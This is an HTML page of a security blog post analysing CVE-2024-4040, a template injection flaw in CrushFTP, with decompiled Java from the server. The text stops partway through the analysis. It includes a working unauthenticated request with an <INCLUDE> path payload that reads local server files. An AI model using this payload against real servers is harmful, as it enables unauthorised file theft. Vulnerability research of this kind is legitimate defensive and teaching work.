<!DOCTYPE html>
<html class="no-js" lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis - PwnFuzz - Security Research &amp; Exploit Development</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	
	
	
<meta name="robots" content="index, follow">
<meta name="author" content="map[avatar:/img/profile-placeholder.jpg bio:Vulnerability Researcher, Exploit Developer name:D4mianWayne]">
<meta name="keywords" content="pwnfuzz, security research, exploit development, vulnerability analysis, binary exploitation, fuzzing, red team, penetration testing, CVE analysis, offensive security">


<link rel="canonical" href="http://localhost:1313/posts/crushftp-cve-2024-4040/">



<meta property="og:site_name" content="PwnFuzz - Security Research &amp; Exploit Development">
<meta property="og:title" content="CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis - PwnFuzz - Security Research &amp; Exploit Development">
<meta property="og:description" content="This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.
CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability

I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.">
<meta property="og:url" content="http://localhost:1313/posts/crushftp-cve-2024-4040/">
<meta property="og:type" content="article">
<meta property="og:locale" content="en">






<meta property="article:published_time" content="2024-05-09T00:00:00Z">


<meta property="article:tag" content="cve-2024-4040">

<meta property="article:tag" content="Java">

<meta property="article:tag" content="SSTI">

<meta property="article:tag" content="RCE">




<meta property="article:section" content="CVE Analysis">







<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@D4mianWayne">
<meta name="twitter:creator" content="@D4mianWayne">
<meta name="twitter:title" content="CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis">
<meta name="twitter:description" content="This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.
CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability

I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.">








<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis",
  "description": "\u003cp\u003eThis blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available \u003ca href=\u0022https:\/\/github.com\/D4mianWayne\/POCs\/tree\/main\/CVE%202024-4040\u0022\u003ehere\u003c\/a\u003e.\u003c\/p\u003e\n\u003ch1 id=\u0022cve-2024-4040---crushftp-server-side-template-injection-vulnerability\u0022\u003eCVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability\u003c\/h1\u003e\n\u003chr\u003e\n\u003cp\u003eI am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.\u003c\/p\u003e",
  "image": "https://pwnfuzz.com/img/pwnfuzz.png",
  "author": {
    "@type": "Person",
    "name": "D4mianWayne"
  },
  "publisher": {
    "@type": "Organization",
    "name": "PwnFuzz",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pwnfuzz.com/img/pwnfuzz.png"
    }
  },
  "datePublished": "2024-05-09T00:00:00Z",
  "dateModified": "2024-05-09T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http:\/\/localhost:1313\/posts\/crushftp-cve-2024-4040\/"
  }
}
</script>



<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="X-XSS-Protection" content="1; mode=block">
<meta name="referrer" content="strict-origin-when-cross-origin"> 
	
	
	












<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "WebSite",
  "name": "PwnFuzz",
  "url": "https://pwnfuzz.com",
  "potentialAction": {
    "@type": "SearchAction",
    "target": "https://pwnfuzz.com/search?q={search_term_string}",
    "query-input": "required name=search_term_string"
  }
}
</script> 
		<meta property="og:url" content="http://localhost:1313/posts/crushftp-cve-2024-4040/">
  <meta property="og:site_name" content="PwnFuzz - Security Research & Exploit Development">
  <meta property="og:title" content="CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis">
  <meta property="og:description" content="This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.
CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-09T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-05-09T00:00:00+00:00">
    <meta property="article:tag" content="Cve-2024-4040">
    <meta property="article:tag" content="Java">
    <meta property="article:tag" content="SSTI">
    <meta property="article:tag" content="RCE">

		
  <meta itemprop="name" content="CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis">
  <meta itemprop="description" content="This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.
CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.">
  <meta itemprop="datePublished" content="2024-05-09T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-05-09T00:00:00+00:00">
  <meta itemprop="wordCount" content="4800">
  <meta itemprop="keywords" content="Cve-2024-4040,Java,SSTI,RCE">
		
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis">
  <meta name="twitter:description" content="This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.
CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo logo--mixed">
		<a class="logo__link" href="/" title="PwnFuzz" rel="home">
			<div class="logo__item logo__imagebox">
					<img class="logo__img" src="/img/pwnfuzz.png">
				</div><div class="logo__item logo__text">
					<div class="logo__title">PwnFuzz</div>
					<div class="logo__tagline">Fuzz. Pwn. Repeat.</div>
				</div>
		</a>
	</div>
		
<nav class="menu">
	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
		<span class="menu__btn-title" tabindex="-1">Menu</span>
	</button>
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/">
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/1day-breakdowns/">
				
				<span class="menu__text">1Day Breakdowns</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/tags/">
				
				<span class="menu__text">Tags</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about/">
				
				<span class="menu__text">About</span>
				
			</a>
		</li>
	</ul>
</nav>

	</div>
</header>

		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis</h1>
			<div class="post__meta meta">
<div class="meta__item-datetime meta__item">
	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2024-05-09T00:00:00Z">May 09, 2024</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/cve-analysis/" rel="category">CVE Analysis</a>
	</span>
</div></div>
		</header>
		
<div class="post__toc toc">
	<div class="toc__title">Page content</div>
	<div class="toc__menu">
		<nav id="TableOfContents">
  <ul>
    <li><a href="#custom-templating-engine">Custom Templating Engine</a>
      <ul>
        <li><a href="#arbitrary-file-read-vulnerability-via-ssti">Arbitrary File Read Vulnerability via SSTI</a></li>
      </ul>
    </li>
    <li><a href="#leveraging-to-rce">Leveraging to RCE</a></li>
    <li><a href="#patch">Patch</a>
      <ul>
        <li><a href="#references">References:</a></li>
      </ul>
    </li>
  </ul>
</nav>
	</div>
</div><div class="content post__content clearfix">
			<p>This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available <a href="https://github.com/D4mianWayne/POCs/tree/main/CVE%202024-4040">here</a>.</p>
<h1 id="cve-2024-4040---crushftp-server-side-template-injection-vulnerability">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability</h1>
<hr>
<p>I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.</p>
<p>Before we delve into the vulnerability and exploit, at the time of writing this blog, there are numerous other articles, exploits and scanning script available on the Internet. I have used them for reference at times to understand which part of the server was actually vulnerable.</p>
<blockquote>
<p><a href="https://www.crushftp.com/crush11wiki/Wiki.jsp?page=Update">Source</a>:
<strong>April 19th, 2024</strong> - CVE-2024-4040 CrushFTP v11 versions below 11.1 have a vulnerability where users can  escape their VFS and download system files.  This has been patched in v11.1.0.  Customers using a <a href="https://www.crushftp.com/crush11wiki/Wiki.jsp?page=DMZ">DMZ</a> in front of their main CrushFTP instance are partially protected with its protocol translation system it utilizes.  A DMZ however does not fully protect you and you must update immediately.  (CREDIT:Simon Garrelou, of Airbus CERT)</p></blockquote>
<p>Given that the all versions below 11.1.0 and specific version of 10.x is vulnerable to SSTI vulnerability, it could really help us if we can get an older version of this. In this case, there was <code>shokinn/crushftp:latest</code> docker image was present which can spin up a local CrushFTP server with 30 days of trial, more than enough for us to walk through such vulnerability.</p>
<p>Once the docker is up and running, we can login to the CrushFTP and confirm the version is 9.3.1_9</p>
<p><img src="/img/CrushFTP/Untitled.png" alt="Untitled"></p>
<p>From the publicly available data, I found that the vulnerability that allow reading of local files can be triggered by navigating to following URL:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#f92672">/</span>WebInterface<span style="color:#f92672">/</span>function<span style="color:#f92672">/?</span>command<span style="color:#f92672">=</span>zip<span style="color:#f92672">&amp;</span>c2f<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;+cookies[&#39;currentAuth&#39;]+&#34;</span><span style="color:#f92672">&amp;</span>path<span style="color:#f92672">=&lt;</span>INCLUDE<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#34;+path+&#34;</span><span style="color:#f92672">&lt;/</span>INCLUDE<span style="color:#f92672">&gt;&amp;</span>names<span style="color:#f92672">=*</span><span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>If we break this URL down, we see that on the <code>/WebInterface/function</code> endpoint it gives <code>command</code> parameter with a value of <code>zip</code> followed by <code>c2f</code> which will contain <code>currentAuth</code> value from the cookie and a <code>path</code> parameter where the payload is given. As we already know that this is an unauthenticated vulnerability, this endpoint seemingly don’t require any kind of authentication. More so, it seems like an API call being made for performing a zip operation on the defined path. To further look into this, I checked the <code>ServerSessionAJAX.class</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?xml version=\&#34;1.0\&#34; encoding=\&#34;UTF-8\&#34;?&gt; \r\n&#34;</span>;
</span></span><span style="display:flex;"><span>names <span style="color:#f92672">=</span> crushftp.<span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">url_decode</span>(request.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;names&#34;</span>)).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>).<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\r\n&#34;</span>);
</span></span><span style="display:flex;"><span>citrix_api_subdomain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>buttons <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Vector();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> StringBuffer firstItemName <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuffer();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (x <span style="color:#f92672">=</span> 0; x <span style="color:#f92672">&lt;</span> names.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span>x) {
</span></span><span style="display:flex;"><span>  response <span style="color:#f92672">=</span> names<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>response.<span style="color:#a6e22e">startsWith</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">SG</span>(<span style="color:#e6db74">&#34;root_dir&#34;</span>))) {
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">SG</span>(<span style="color:#e6db74">&#34;root_dir&#34;</span>) <span style="color:#f92672">+</span> response.<span style="color:#a6e22e">substring</span>(1);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">cd</span>(response);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">check_access_privs</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">pwd</span>(), <span style="color:#e6db74">&#34;RETR&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">check_access_privs</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">pwd</span>(), <span style="color:#e6db74">&#34;STOR&#34;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uiPUT</span>(<span style="color:#e6db74">&#34;the_command&#34;</span>, <span style="color:#e6db74">&#34;ZIP&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uiPUT</span>(<span style="color:#e6db74">&#34;the_command_data&#34;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">pwd</span>());
</span></span><span style="display:flex;"><span>    transfer_lock <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uVFS</span>.<span style="color:#a6e22e">get_item</span>(response);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (firstItemName.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">==</span> 0) {
</span></span><span style="display:flex;"><span>      firstItemName.<span style="color:#a6e22e">append</span>(transfer_lock.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;name&#34;</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uVFS</span>.<span style="color:#a6e22e">getListing</span>(buttons, response, 999, 50000, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      citrix_api_subdomain <span style="color:#f92672">=</span> citrix_api_subdomain <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;You need download, upload permissions to zip a file:&#34;</span> <span style="color:#f92672">+</span> response <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    refresh_token <span style="color:#f92672">=</span> crushftp.<span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">url_decode</span>(request.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;path&#34;</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>refresh_token.<span style="color:#a6e22e">startsWith</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">SG</span>(<span style="color:#e6db74">&#34;root_dir&#34;</span>))) {
</span></span><span style="display:flex;"><span>      refresh_token <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">SG</span>(<span style="color:#e6db74">&#34;root_dir&#34;</span>) <span style="color:#f92672">+</span> refresh_token.<span style="color:#a6e22e">substring</span>(1);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">check_access_privs</span>(refresh_token, <span style="color:#e6db74">&#34;STOR&#34;</span>)) {
</span></span><span style="display:flex;"><span>      citrix_api_subdomain <span style="color:#f92672">=</span> citrix_api_subdomain <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Started zipping...\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>      ppp <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uVFS</span>.<span style="color:#a6e22e">get_item</span>(refresh_token);
</span></span><span style="display:flex;"><span>      name <span style="color:#f92672">=</span> (<span style="color:#66d9ef">new</span> VRL(ppp.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;url&#34;</span>))).<span style="color:#a6e22e">getPath</span>();
</span></span><span style="display:flex;"><span>      Worker.<span style="color:#a6e22e">startWorker</span>(<span style="color:#66d9ef">new</span> Runnable() {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span>() {
</span></span><span style="display:flex;"><span>            String zipName <span style="color:#f92672">=</span> firstItemName.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> crushftp.<span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">makeBoundary</span>(3);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>              crushftp.<span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">zip</span>(name, buttons, name <span style="color:#f92672">+</span> zipName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.zipping&#34;</span>);
</span></span><span style="display:flex;"><span>              (<span style="color:#66d9ef">new</span> File_U(name <span style="color:#f92672">+</span> zipName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.zipping&#34;</span>)).<span style="color:#a6e22e">renameTo</span>(<span style="color:#66d9ef">new</span> File_U(name <span style="color:#f92672">+</span> zipName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.zip&#34;</span>));
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception var3) {
</span></span><span style="display:flex;"><span>              crushftp.<span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">debug</span>(0, (Exception) var3);
</span></span><span style="display:flex;"><span>              (<span style="color:#66d9ef">new</span> File_U(name <span style="color:#f92672">+</span> zipName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.zipping&#34;</span>)).<span style="color:#a6e22e">renameTo</span>(<span style="color:#66d9ef">new</span> File_U(name <span style="color:#f92672">+</span> zipName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.bad&#34;</span>));
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#34;Zipping:&#34;</span> <span style="color:#f92672">+</span> refresh_token <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> request.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;names&#34;</span>));
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          citrix_api_subdomain <span style="color:#f92672">=</span> citrix_api_subdomain <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;You need upload permissions to zip a file:&#34;</span> <span style="color:#f92672">+</span> request.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;path&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> response <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;commandResult&gt;&lt;response&gt;&#34;</span> <span style="color:#f92672">+</span> citrix_api_subdomain <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/response&gt;&lt;/commandResult&gt;&#34;</span>; <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uVFS</span>.<span style="color:#a6e22e">reset</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>));
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p>As we see here, this part of code ends up checking if we have the proper permission to zip the requested file path and we won’t be having it, in this particular case, so what will happen is the following piece of code will be taken place:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      citrix_api_subdomain <span style="color:#f92672">=</span> citrix_api_subdomain <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;You need upload permissions to zip a file:&#34;</span> <span style="color:#f92672">+</span> request.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;path&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p>Something to notice here is that our parameter value of <code>path</code> is being included in the response as well and then it is passed to the <code>this.WriteResponse</code> , if we look closely into the <code>WriteResponse</code> functions, a method overloading approach has been done to this such that this function will be called in accordance to the parameters passed to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response, <span style="color:#66d9ef">true</span>, 200, <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response, <span style="color:#66d9ef">boolean</span> json) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response, <span style="color:#66d9ef">true</span>, 200, <span style="color:#66d9ef">true</span>, json, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response, <span style="color:#66d9ef">boolean</span> log, <span style="color:#66d9ef">int</span> code, <span style="color:#66d9ef">boolean</span> convertVars, <span style="color:#66d9ef">boolean</span> json, <span style="color:#66d9ef">boolean</span> log_header) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">boolean</span> acceptsGZIP <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response, log, code, convertVars, json, acceptsGZIP, log_header);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
